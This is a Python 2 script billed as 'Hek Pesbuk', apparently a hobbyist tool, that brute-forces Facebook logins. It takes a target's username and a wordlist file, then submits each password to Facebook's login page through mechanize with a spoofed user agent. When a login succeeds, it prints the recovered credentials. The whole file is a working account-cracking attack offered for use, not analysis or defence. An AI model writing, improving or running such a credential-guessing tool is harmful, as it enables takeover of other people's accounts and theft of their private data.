#!/usr/bin/python
# -*- coding: utf-8 -*-
# Pesbuk SQL
# Coded by Senja
# Github: github.com/stepbystepexe/Pesbuksql

import os, sys, time, random, cookielib, mechanize

def loads():
    tix = [
     '.   ', '..  ', '... ']
    for o in tix:
        print '\r\x1b[0m[\x1b[94;1m\xe2\x97\x8f\x1b[0m] \x1b[0mProcessing ' + o,
        sys.stdout.flush()
        time.sleep(1)

def write(a):
        for q in a + '\n':
                sys.stdout.write(q)
                sys.stdout.flush()
                time.sleep(10. / 100)

def banner():
    os.system('clear')
    os.system('reset')
    time.sleep(1)
    print
    print
    print ('     \x1b[0;41;31m[ ]\x1b[0m \x1b[0;42;32m[ ]\x1b[0m \x1b[0;44;34m[ ]\x1b[0m        \x1b[0;40;37m[⁂]\x1b[0m')
    print ('      |   |   |          |')
    print ('\x1b[106;96m[]\x1b[100;90m[]\x1b[0m~\x1b[4m\x1b[0;90;46;1m Hek \x1b[0;97;45;1m Pesbuk \033[0;90;43;1m Targets \033[0m~\x1b[103;93m[]\x1b[102;92m[]\x1b[105;95m[]\x1b[107;97m[]\x1b[0m')
    print ('              \x1b[1;77m/\x1b[0m')
    print ('     \x1b[0;90;47;1m * \x1b[0;1;104m Coded by \x1b[0;1;101m # Senja \x1b[0m')
    print
    print

banner()

email_target = str(raw_input('\x1b[0m[\x1b[96;1m?\x1b[0m] \x1b[77;1mUsername: \x1b[0m'))
print
write ('\x1b[77;1;4mN O T E: \x1b[0;4mEnter the wordlist name*\x1b[0m')
password_list = str(raw_input('\x1b[0m[\x1b[95;1m+\x1b[0m] \x1b[77;1mPassword: \x1b[0m'))
login = 'https://www.facebook.com/login.php?login_attempt=1'
useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Geck')]

def restart_program():
                print
                ask = str(raw_input('\x1b[0m[\x1b[95;1m?\x1b[0m] \x1b[77;1mRestart the program \x1b[0m[Y/n] : \x1b[77;1m'))
                if ask == 'Y' or ask == 'y':
                    os.system('python2 pesbukchecker.py')
                elif ask == 'N' or ask == 'n':
                    print
                    print ('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mExit')
                    print
                    sys.exit(1)
                else:
                    print
                    print ('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mInvalid option')
                    print
                    restart_program()

def edit_wordlist():

        print
        ask = str(raw_input('\x1b[0m[\x1b[95;1m?\x1b[0m] \x1b[77;1mModified the wordlist \x1b[0m[Y/n] : \x1b[77;1m'))
        if ask == 'Y' or ask == 'y':
                os.system('nano '+password_list)
                pil()
        elif ask == 'N' or ask == 'n':
                print
                print ('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mExit')
                print
                sys.exit(1)

        else:
                print
                print ('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mInvalid option')
                print
                edit_wordlist()

def main():
        global br
        br = mechanize.Browser()
        cj = cookielib.LWPCookieJar()
        br.set_handle_robots(False)
        br.set_handle_redirect(True)
        br.set_cookiejar(cj)
        br.set_handle_equiv(True)
        br.set_handle_referer(True)
        br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
        running()
        checker()
        print
        print ('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mWordlist not found')
        print

def word(lst_password):
    try:
        sys.stdout.write('\n\x1b[0m[\x1b[94;1;3m '+email_target+'\x1b[0m ] \033[0;4mTrying pass\033[0m \xf0\x9f\x91\x89\033[91;1;3m '+lst_password+'\x1b[0m')
        sys.stdout.flush()
        br.addheaders = [('User-agent', random.choice(useragents))]
        site = br.open(login)
        br.select_form(nr = 0)
        br.form['email'] = email_target
        br.form['pass'] = lst_password
        ok = br.submit()
        mask = ok.geturl()
        if mask != login and (not 'login_attempt' in mask):
                        os.system('xdg-open https://github.com/stepbystepexe/')
                        print
                        print ('\x1b[0m[\x1b[94;1m+\x1b[0m] \x1b[77;1mSuccess')
                        print ('\x1b[0m[\x1b[96;1m&\x1b[0m] \x1b[77;1mChecker Password Find')
                        print
                        print ('\x1b[0m[\x1b[95;1m$\x1b[0m] \x1b[0mUsername: \033[77;1m {}').format(email_target)
                        print ('\x1b[0m[\x1b[93;1m=\x1b[0m] \x1b[0mPassword: \033[77;1m {}').format(lst_password)
                        print
                        raw_input('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mPress enter to exit : ')
                        sys.exit(1)


    except KeyboardInterrupt:
        print ('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mStopped')
        edit_wordlist()
        sys.exit(1)

def checker():
        global lst_password
        passw = open(password_list, "r")
        for lst_password in passw:
                passw = lst_password.replace("\n","")
                word(lst_password)

def running():
         global password_list
         print
         write ('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mPlease Wait...')
         print
         ok = open(password_list, 'r')
         ok = ok.readlines()
         time.sleep(5)
         print '\x1b[0m[\x1b[92;1m#\x1b[0m] \x1b[77;1mUsername: \x1b[0m{}'.format(email_target)
         print '\x1b[0m[\x1b[93;1m*\x1b[0m] \x1b[77;1mPassword: ',len(ok),'password'
         loads()
         print
         print
         time.sleep(5)

if __name__=='__main__':
        main()
